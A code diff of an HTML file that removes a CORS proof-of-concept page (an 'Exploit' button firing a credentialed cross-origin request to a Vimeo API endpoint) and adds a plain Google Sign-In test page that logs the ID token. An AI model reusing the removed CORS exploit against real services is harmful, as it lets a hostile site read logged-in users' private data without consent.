@@ -1,26 +1,28 @@
+<!DOCTYPE html>
 <html>
-    <head>
-        <script>
-            function cors() {
-                var xhttp=new XMLHttpRequest();
-                    xhttp.onreadystatechange= function() {
-                        if (this.readyState == 4 && this.status ==200){
-                            document.getElementById("emo").innerHTML=alert(this.responseText
-                                );
-                        }
-                };
-                xhttp.open('GET',"https://api.vimeo.com/upload/config?",true);
-                xhttp.withCredentials=true;
-                xhttp.send();
-            }
-        </script>
-    </head>
-    <body>
-        <center>
-        <h2>[!]CORS P0C - Qualw1n</h2>
-        <div id="demo">
-            <button type="button" onclick="cors()">Exploit</button> 
-        </div>
-        </center>
-    </body>
+  <head>
+    <title>Google Sign-In Test</title>
+    <script src="https://accounts.google.com/gsi/client" async defer></script>
+    <script>
+      function handleCredentialResponse(response) {
+        console.log("ID Token: ", response.credential);
+      }
+
+      window.onload = function () {
+        google.accounts.id.initialize({
+          client_id: "770751163800-8nqvvfpfvkg5n0u8rehr1fa56m2qsu62.apps.googleusercontent.com",
+          callback: handleCredentialResponse
+        });
+
+        google.accounts.id.renderButton(
+          document.getElementById("g_id_signin"),
+          { theme: "outline", size: "large" }
+        );
+      };
+    </script>
+  </head>
+  <body>
+    <h2>Sign in with Google</h2>
+    <div id="g_id_signin"></div>
+  </body>
 </html>
